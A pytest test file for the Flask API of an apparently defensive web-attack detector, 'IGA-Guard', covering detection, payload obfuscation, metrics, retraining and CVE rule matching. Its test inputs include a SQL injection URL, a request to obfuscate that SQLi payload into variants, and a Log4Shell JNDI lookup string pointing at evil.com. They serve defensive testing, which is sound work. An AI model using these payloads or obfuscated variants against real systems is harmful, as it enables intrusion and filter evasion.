"""Flask REST API 验收测试（test client）。"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from backend.app import create_app, incremental_retrain  # noqa: E402


@pytest.fixture(scope="module")
def client():
    app = create_app()
    app.config["TESTING"] = True
    with app.test_client() as c:
        yield c


class TestFlaskAPI:
    def test_health(self, client):
        r = client.get("/api/health")
        assert r.status_code == 200
        data = r.get_json()
        assert data["status"] == "ok"
        assert data["service"] == "IGA-Guard"
        assert "version" in data

    def test_detect_sqli(self, client):
        r = client.post(
            "/api/detect",
            json={"method": "GET", "url": "http://demo/login?id=1+union+select+1,2--"},
        )
        assert r.status_code == 200
        data = r.get_json()
        assert data["detection"]["is_malicious"] is True
        assert data["detection"]["latency_ms"] >= 0

    def test_detect_normal(self, client):
        r = client.post(
            "/api/detect",
            json={"method": "GET", "url": "http://demo/login?user=alice&page=home"},
        )
        assert r.status_code == 200
        data = r.get_json()
        assert data["detection"]["label"] == "Normal"
        assert data["detection"]["is_malicious"] is False

    def test_obfuscate(self, client):
        r = client.post(
            "/api/obfuscate",
            json={"payload": "1 union select 1,2--", "attack_type": "SQLi", "count": 5},
        )
        assert r.status_code == 200
        data = r.get_json()
        assert data["count"] >= 1
        assert len(data["variants"]) >= 1
        assert data["variants"][0]["source"] == "original"

    def test_obfuscate_empty_payload(self, client):
        r = client.post("/api/obfuscate", json={"payload": ""})
        assert r.status_code == 400
        assert r.get_json()["error"] == "payload required"

    def test_metrics_overall(self, client):
        r = client.get("/api/metrics/overall")
        assert r.status_code == 200
        data = r.get_json()
        assert 0.85 <= data["obfuscated_attack_recall"] <= 1.0
        assert 0.0 <= data["normal_false_positive_rate"] <= 0.1
        assert data["source"] == "results/v2_exp1_overall.json"

    def test_evolve_returns_status(self, client):
        r = client.post("/api/evolve")
        assert r.status_code == 200
        data = r.get_json()
        assert "updated" in data

    def test_evolve_uses_base_train_csv(self):
        """确认 evolve 端点传入 base_train_csv 参数（合并重训）。"""
        import inspect

        sig = inspect.signature(incremental_retrain)
        assert "base_train_csv" in sig.parameters

        source = Path(ROOT / "backend" / "app.py").read_text(encoding="utf-8")
        assert "base_train_csv=str(ROOT / \"data\" / \"master\" / \"train_obfuscated.csv\")" in source

    def test_dashboard_index(self, client):
        r = client.get("/")
        assert r.status_code == 200
        assert b"IGA-Guard 3.0" in r.data

    def test_rules_virtual_patches(self, client):
        r = client.get("/api/rules/virtual-patches")
        assert r.status_code == 200
        data = r.get_json()
        assert data["count"] >= 1
        assert "CVE-2021-44228" in {p["cve_id"] for p in data["patches"]}

    def test_rules_match_log4shell(self, client):
        r = client.post(
            "/api/rules/match",
            json={"payload": "${jndi:ldap://evil.com/a}"},
        )
        assert r.status_code == 200
        assert r.get_json()["match"]["cve_id"] == "CVE-2021-44228"

    def test_six_pages_static(self, client):
        for page in (
            "hub.html",
            "p1_monitor.html",
            "p2_detail.html",
            "p3_localization.html",
            "p4_risk.html",
            "p5_evolution.html",
            "p6_rules.html",
        ):
            r = client.get(f"/static/{page}")
            assert r.status_code == 200
            assert b"IGA-Guard 3.0" in r.data
